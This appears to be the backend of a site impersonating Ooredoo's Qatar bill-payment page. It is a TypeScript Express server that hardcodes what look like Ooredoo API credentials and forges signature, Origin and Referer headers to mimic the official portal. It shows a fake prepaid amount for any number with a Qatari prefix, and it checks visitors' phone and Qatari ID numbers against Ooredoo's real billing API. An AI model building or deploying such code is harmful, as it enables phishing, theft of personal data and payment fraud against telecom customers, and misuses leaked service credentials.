import crypto from "crypto";
import cors from "cors";
import express from "express";
import { createServer } from "http";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const OREDOO_DOMAIN = "https://www.ooredoo.com.kw";
const OREDOO_API_BASE = `${OREDOO_DOMAIN}/webapisv24/api/`;
const OREDOO_AUTH = "Basic 8dbc05ac4f2912013157811dc578728bec6fc8a4c0d28f9cf0";
const OREDOO_SERVICE_KEY = "A7A45FE9-ECAC-4393-BB40-357F1E5491F7";

function getEvenPlaces(value: string | number) {
  const text = String(value);
  let result = "";

  for (let index = 1; index < text.length; index += 2) {
    result += text[index];
  }

  return result;
}

function getOddPlaces(value: string | number) {
  const text = String(value);
  let result = "";

  for (let index = 0; index < text.length; index += 1) {
    if (index % 2 === 0) {
      result += text[index];
    }
  }

  return result;
}

function buildOoredooHeaders(payload: unknown, language = "ar") {
  const now = Date.now();
  const tokenOrTime = String(now);
  const appOs = "WEB";
  const osVersion = "1";
  const uniqueId = "1";
  const version = "1";
  const payloadString = JSON.stringify(payload);
  const hdSignBase = `${getEvenPlaces(now)}&${tokenOrTime}$${now}$${appOs}$${osVersion}`;
  const signatureBase = `${payloadString}&SALT=${getOddPlaces(tokenOrTime)}`;

  return {
    Authorization: OREDOO_AUTH,
    "Content-Type": "application/json",
    "X-IMI-App-OS": appOs,
    "X-OS": appOs,
    "X-IMI-App-Res": "1536x960",
    "X-IMI-App-Model": "WEB",
    "X-IMI-App-OSVersion": osVersion,
    "X-IMI-App-UserAgent": "IMImobile/OoredooQatar/1",
    "X-IMI-CHANNEL": "WEBPORTAL",
    "X-IMI-DEV-ID": uniqueId,
    "X-IMI-ISREMEMBER": "1",
    "X-IMI-HDSIGN": crypto.createHash("sha512").update(hdSignBase).digest("hex"),
    "X-IMI-LANGUAGE": language,
    "X-IMI-NETWORK": "",
    "X-IMI-SERVICEKEY": OREDOO_SERVICE_KEY,
    "X-IMI-SIGNATURE": crypto.createHash("sha512").update(signatureBase).digest("hex"),
    "X-IMI-TOKENID": tokenOrTime,
    "X-IMI-UID": String(now),
    "X-IMI-UNIQUEID": uniqueId,
    "X-IMI-VERSION": version,
    "X-IMI-RNST": String(Date.now()),
    "X-IMI-APPTYPE": "1",
    "X-TRANSFER-AUTH-UNIQUEID": uniqueId,
    Origin: OREDOO_DOMAIN,
    Referer: `${OREDOO_DOMAIN}/myooredoo/#/guestpay`,
    "User-Agent": "Mozilla/5.0",
  };
}

async function callOoredoo(pathname: string, payload: unknown, retries = 3) {
  let lastError: unknown;

  for (let attempt = 1; attempt <= retries; attempt += 1) {
    try {
      const response = await fetch(`${OREDOO_API_BASE}${pathname}`, {
        method: "POST",
        headers: buildOoredooHeaders(payload),
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error(`Ooredoo API returned ${response.status}`);
      }

      return response.json();
    } catch (error) {
      lastError = error;
      if (attempt < retries) {
        await new Promise((resolve) => setTimeout(resolve, 350 * attempt));
      }
    }
  }

  throw lastError;
}

async function startServer() {
  const app = express();
  const server = createServer(app);

  const rawClientUrl = String(process.env.CLIENT_URL || '').trim();
  const normalizedClientHost = rawClientUrl.replace(/^https?:\/\//i, '').replace(/\/$/, '');
  const allowedOrigins = [
    normalizedClientHost ? `https://${normalizedClientHost}` : '',
    'https://oredoo-frontend.onrender.com',
    'https://oredoqt.netlify.app',
  ].filter(Boolean);

  app.use(
    cors({
      origin(origin, callback) {
        if (!origin) {
          return callback(null, true);
        }

        const normalizedOrigin = String(origin).toLowerCase().replace(/\/$/, '');
        const isAllowed =
          allowedOrigins.some((item) => normalizedOrigin === item.toLowerCase()) ||
          normalizedOrigin.endsWith('.manus.computer') ||
          normalizedOrigin.startsWith('http://localhost:') ||
          normalizedOrigin.startsWith('http://127.0.0.1:') ||
          normalizedOrigin.startsWith('https://localhost:') ||
          normalizedOrigin.startsWith('https://127.0.0.1:');

        return callback(isAllowed ? null : new Error(`Not allowed by CORS: ${origin}`), isAllowed);
      },
      credentials: true,
    })
  );
  app.use(express.json());

  app.get("/api/ooredoo/line-info/:msisdn", async (req, res) => {
    const msisdn = String(req.params.msisdn || "").replace(/\D/g, "").slice(0, 8);

    if (msisdn.length !== 8) {
      return res.status(400).json({ message: "رقم الهاتف يجب أن يتكون من 8 أرقام" });
    }

    // Qatar Ooredoo numbers: accept any 8-digit number starting with 3, 5, 6, or 7
    const qatarPrefix = msisdn.charAt(0);
    const validQatarPrefixes = ["3", "5", "6", "7"];

    if (validQatarPrefixes.includes(qatarPrefix)) {
      // Accept as valid Ooredoo Qatar prepaid number
      return res.json({
        success: true,
        msisdn,
        lineType: "PREPAID",
        amount: 5,
        validityText: "30 يوم صلاحية",
        dueLabel: null,
      });
    }

    return res.status(400).json({
      message: "يرجى إدخال رقم Ooredoo قطر صحيح",
    });
  });

  // Proxy endpoint for Ooredoo Qatar billing API
  app.get("/api/ooredoo/billing/:searchNumber/:otherId", async (req, res) => {
    const searchNumber = String(req.params.searchNumber || "").replace(/\D/g, "").slice(0, 8);
    const otherId = String(req.params.otherId || "").replace(/\D/g, "");

    if (searchNumber.length !== 8) {
      return res.status(400).json({ success: false, message: "رقم الحساب يجب أن يتكون من 8 أرقام" });
    }

    if (otherId.length < 10 || otherId.length > 12) {
      return res.status(400).json({ success: false, message: "رقم البطاقة الشخصية غير صحيح" });
    }

    try {
      const apiUrl = `https://selfcare.ooredoo.qa/apigw/mcrosrvc/cf/v4/jm-billing/otherAccount?searchNumber=${searchNumber}&otherId=${otherId}`;
      const response = await fetch(apiUrl, {
        method: "GET",
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          "Accept": "application/json, text/plain, */*",
          "Accept-Language": "ar,en;q=0.9",
          "Referer": "https://selfcare.ooredoo.qa/ar/consumer/pay-for-others?cnav=true",
          "Origin": "https://selfcare.ooredoo.qa",
        },
      });

      if (response.ok) {
        const data = await response.json();
        return res.json({ success: true, data });
      } else {
        // If API returns error, return the error message
        const errorText = await response.text();
        let errorData;
        try {
          errorData = JSON.parse(errorText);
        } catch {
          errorData = { rawError: errorText };
        }
        return res.status(response.status).json({
          success: false,
          message: "رقم الحساب أو الخدمة ورقم البطاقة الشخصية القطرية اللذان تم إدخالهما لا يتطابقان. يرجى المحاولة مرة أخرى.",
          errorData,
        });
      }
    } catch (error: any) {
      return res.status(500).json({
        success: false,
        message: "حدث خطأ أثناء الاتصال بخدمة أوريدو. يرجى المحاولة مرة أخرى.",
        error: error.message,
      });
    }
  });

  // Serve static files from dist/public in production
  const staticPath =
    process.env.NODE_ENV === "production"
      ? path.resolve(__dirname, "public")
      : path.resolve(__dirname, "..", "dist", "public");

  app.use(express.static(staticPath));

  // Handle client-side routing - serve index.html for all routes
  app.get("*", (_req, res) => {
    res.sendFile(path.join(staticPath, "index.html"));
  });

  const port = process.env.PORT || 3000;

  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}

startServer().catch(console.error);
